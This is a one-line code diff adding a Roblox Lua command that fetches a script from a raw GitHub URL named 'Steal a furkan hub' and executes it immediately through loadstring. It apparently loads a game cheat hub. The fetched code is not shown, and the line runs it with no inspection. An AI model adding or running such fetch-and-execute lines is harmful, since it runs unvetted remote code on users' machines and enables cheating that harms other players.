@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/m13504525-afk/Steal-a-furkan/refs/heads/main/Steal%20a%20furkan%20hub"))()
